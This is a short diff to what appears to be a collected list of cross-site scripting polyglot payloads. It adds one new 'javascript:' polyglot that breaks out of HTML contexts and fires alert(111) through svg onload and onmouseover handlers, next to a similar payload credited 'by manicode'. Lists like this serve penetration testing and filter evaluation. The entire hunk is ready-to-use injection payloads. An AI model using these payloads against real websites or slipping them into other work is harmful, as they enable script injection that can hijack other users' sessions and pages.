@@ -485,6 +485,8 @@ javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></
 
 # by manicode
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert(111)//>
+
 
 ```
 
